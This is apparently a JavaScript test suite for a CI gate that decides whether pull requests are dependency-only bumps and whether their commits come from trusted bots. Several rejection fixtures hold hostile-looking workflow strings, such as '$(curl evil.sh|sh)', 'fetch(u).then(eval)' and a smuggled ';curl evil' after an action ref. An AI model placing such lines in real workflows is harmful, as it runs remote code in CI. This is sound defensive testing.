import { test } from 'node:test';
import assert from 'node:assert/strict';
import { isDependencyOnlyChange, commitsAreTrusted, FILES_API_CAP, COMMITS_CAP, APP_NAME, APP_EMAIL } from './dependency-only.mjs';

const f = (filename, extra = {}) => ({ filename, status: 'modified', ...extra });
const wf = (patch, extra = {}) => f('.github/workflows/ci.yml', { patch, ...extra });
const exempt = (files) => isDependencyOnlyChange(files).dependencyOnly;
const bump = (o, n, dash = '- ') =>
  `@@ -1,3 +1,3 @@\n ctx\n-      ${dash}uses: ${o}\n+      ${dash}uses: ${n}\n ctx`;

test('manifest and lockfile bump is dependency-only', () => {
  assert.equal(exempt([f('package.json'), f('yarn.lock')]), true);
});

test('nested manifests and .NET files qualify', () => {
  const names = ['src/app/package.json', 'pnpm-lock.yaml', 'npm-shrinkwrap.json', 'package-lock.json',
    'src/A/A.csproj', 'Directory.Packages.props', 'Directory.Build.props', 'src/packages.lock.json', 'global.json'];
  assert.equal(exempt(names.map((n) => f(n))), true);
});

test('a source file rules it out and is named', () => {
  assert.deepEqual(isDependencyOnlyChange([f('package.json'), f('src/index.ts')]), { dependencyOnly: false, offending: 'src/index.ts' });
});

test('lookalike names do not qualify (package.json.sh, foo.csproj.bak)', () => {
  assert.equal(exempt([f('package.json.sh')]), false);
  assert.equal(exempt([f('foo.csproj.bak')]), false);
  assert.equal(exempt([f('scripts/yarn.lock.js')]), false);
});

test('status removed of a dependency file is not exempt', () => {
  assert.equal(exempt([f('package.json', { status: 'removed' })]), false);
});

test('non-array and empty input are not exempt', () => {
  assert.equal(exempt(null), false);
  assert.equal(exempt('package.json'), false);
  assert.equal(exempt([]), false);
});

test('possibly truncated listing is not exempt', () => {
  assert.equal(exempt(Array.from({ length: FILES_API_CAP }, (_, i) => f(`d${i}/package.json`))), false);
});

test('rename with previous_filename, renamed status, and previous_filename equal to filename', () => {
  assert.equal(exempt([f('package.json', { status: 'renamed', previous_filename: 'x/y.js' })]), false);
  assert.equal(exempt([f('package.json', { status: 'renamed', previous_filename: 'package.json' })]), false);
  assert.equal(exempt([f('package.json', { previous_filename: 'package.json' })]), true);
  assert.equal(exempt([wf(bump('actions/checkout@v6', 'actions/checkout@v7'), { status: 'renamed', previous_filename: '.github/workflows/old.yml' })]), false);
});

test('ref-only bump accepted', () => {
  assert.equal(exempt([wf(bump('actions/checkout@v6', 'actions/checkout@v7'))]), true);
});

test('SHA pin with trailing comment bump accepted', () => {
  const a = 'actions/checkout@' + 'a'.repeat(40) + ' # v6';
  const b = 'actions/checkout@' + 'b'.repeat(40) + ' # v7';
  assert.equal(exempt([wf(bump(a, b))]), true);
});

test('uses without list dash accepted when paired; sub-path actions accepted', () => {
  assert.equal(exempt([wf(bump('a/b@v1', 'a/b@v2', ''))]), true);
  assert.equal(exempt([wf(bump('a/b/sub/x@v1', 'a/b/sub/x@v2'))]), true);
});

test('new step (pure addition) rejected', () => {
  assert.equal(exempt([wf('@@ -1,2 +1,3 @@\n ctx\n+      - uses: evil/x@v1\n ctx')]), false);
});

test('retargeting to another owner rejected', () => {
  assert.equal(exempt([wf(bump('actions/checkout@v6', 'evil/checkout@v6'))]), false);
});

test('run-block injection rejected', () => {
  assert.equal(exempt([wf('@@ -1,2 +1,3 @@\n       run: |\n+        uses: $(curl evil.sh|sh)\n ctx')]), false);
});

test('github-script injection rejected', () => {
  assert.equal(exempt([wf('@@ -1,2 +1,3 @@\n       script: |\n+        uses: fetch(u).then(eval)\n ctx')]), false);
});

test('removal-only patch rejected', () => {
  assert.equal(exempt([wf('@@ -1,3 +1,2 @@\n ctx\n-      - uses: actions/hardening@v1\n ctx')]), false);
});

test('extra characters after the ref rejected', () => {
  assert.equal(exempt([wf(bump('a/b@v1', 'a/b@v2;curl evil'))]), false);
  assert.equal(exempt([wf(bump('a/b@v1', 'a/b@v2 && x'))]), false);
});

test('docker:// and local actions rejected', () => {
  assert.equal(exempt([wf(bump('docker://alpine:3.18', 'docker://alpine:3.19'))]), false);
  assert.equal(exempt([wf(bump('./local@v1', './local@v2'))]), false);
});

test('indentation or list-dash change within a pair rejected', () => {
  assert.equal(exempt([wf('@@ -1 +1 @@\n-      - uses: a/b@v1\n+    - uses: a/b@v2')]), false);
  assert.equal(exempt([wf('@@ -1 +1 @@\n-      - uses: a/b@v1\n+      uses: a/b@v2')]), false);
});

test('mismatched counts rejected', () => {
  assert.equal(exempt([wf('@@ -1 +1,2 @@\n-      - uses: a/b@v1\n+      - uses: a/b@v2\n+      - uses: a/c@v2')]), false);
});

test('.yaml extension and workflow in a subfolder are not exempt', () => {
  const p = bump('a/b@v1', 'a/b@v2');
  assert.equal(exempt([f('.github/workflows/ci.yaml', { patch: p })]), false);
  assert.equal(exempt([f('.github/workflows/sub/ci.yml', { patch: p })]), false);
});

test('context-only patch, missing patch, status removed/added workflow rejected', () => {
  assert.equal(exempt([wf('@@ -1,2 +1,2 @@\n ctx\n ctx')]), false);
  assert.equal(exempt([f('.github/workflows/ci.yml')]), false);
  assert.equal(exempt([wf(bump('a/b@v1', 'a/b@v2'), { status: 'removed' })]), false);
  assert.equal(exempt([wf(bump('a/b@v1', 'a/b@v2'), { status: 'added' })]), false);
});

// ---- commitsAreTrusted (fixtures mirror the live GET /pulls/{n}/commits shapes) ----
const EX = ['dependabot[bot]', 'renovate[bot]'];
const dependabotCommit = (over = {}) => ({
  author: { login: 'dependabot[bot]' },
  committer: { login: 'web-flow' },
  commit: {
    author: { name: 'dependabot[bot]', email: '49699333+dependabot[bot]@users.noreply.github.com' },
    committer: { name: 'GitHub', email: 'noreply@github.com' },
    verification: { verified: true, reason: 'valid' },
  },
  ...over,
});
const pinAppCommit = (who = {}) => ({
  author: null,
  committer: null,
  commit: {
    author: { name: APP_NAME, email: APP_EMAIL, ...who.author },
    committer: { name: APP_NAME, email: APP_EMAIL, ...who.committer },
    verification: { verified: false, reason: 'unsigned' },
  },
});
const humanCommit = (login = 'alice') => ({
  author: { login },
  committer: { login: 'web-flow' },
  commit: { author: { name: login, email: login + '@example.com' }, committer: { name: 'GitHub', email: 'noreply@github.com' }, verification: { verified: true, reason: 'valid' } },
});
const manifests = [f('package.json'), f('yarn.lock'), f('sub/package-lock.json')];
const trusted = (commits, files = manifests) => commitsAreTrusted(commits, files, EX);

test('verified Dependabot commit is trusted whatever files it touches', () => {
  assert.equal(trusted([dependabotCommit()], [f('src/a.ts')]), true);
});

test('Dependabot commit with verified false or missing verification is not trusted', () => {
  const unverified = dependabotCommit();
  unverified.commit.verification = { verified: false, reason: 'unsigned' };
  assert.equal(trusted([unverified]), false);
  const missing = dependabotCommit();
  delete missing.commit.verification;
  assert.equal(trusted([missing]), false);
});

test('login case variants are matched case-insensitively', () => {
  assert.equal(trusted([dependabotCommit({ author: { login: 'Dependabot[bot]' } })]), true);
  assert.equal(trusted([dependabotCommit({ author: { login: 'RENOVATE[BOT]' } })]), true);
});

test('pin app commit with null author login is trusted when files are manifest-only', () => {
  assert.equal(trusted([dependabotCommit(), pinAppCommit()]), true);
});

test('pin app identity with a differing author or committer email or name is not trusted', () => {
  assert.equal(trusted([pinAppCommit({ author: { email: 'evil@example.com' } })]), false);
  assert.equal(trusted([pinAppCommit({ committer: { email: 'evil@example.com' } })]), false);
  assert.equal(trusted([pinAppCommit({ committer: { name: 'someone' } })]), false);
  assert.equal(trusted([pinAppCommit({ author: { name: 'someone' } })]), false);
});

test('pin app identity with a .mjs or removed or renamed manifest in the files is not trusted', () => {
  assert.equal(trusted([pinAppCommit()], [f('package.json'), f('x.mjs')]), false);
  assert.equal(trusted([pinAppCommit()], [f('package.json', { status: 'removed' })]), false);
  assert.equal(trusted([pinAppCommit()], [f('package.json', { status: 'renamed' })]), false);
});

test('human commit and human merge commit are not trusted', () => {
  assert.equal(trusted([dependabotCommit(), humanCommit('alice')]), false);
  assert.equal(trusted([dependabotCommit(), humanCommit('bob')]), false);
});

test('missing or null commit, author or committer data is not trusted', () => {
  assert.equal(trusted([null]), false);
  assert.equal(trusted([{ author: { login: 'dependabot[bot]' } }]), false);
  assert.equal(trusted([{ author: null, commit: {} }]), false);
  assert.equal(trusted([{ author: null, commit: { author: { name: APP_NAME, email: APP_EMAIL } } }]), false);
});

test('empty, non-array and 250 commits are not trusted', () => {
  assert.equal(trusted([]), false);
  assert.equal(trusted(null), false);
  assert.equal(trusted(Array.from({ length: COMMITS_CAP }, () => dependabotCommit())), false);
  assert.equal(trusted(Array.from({ length: COMMITS_CAP - 1 }, () => dependabotCommit())), true);
});
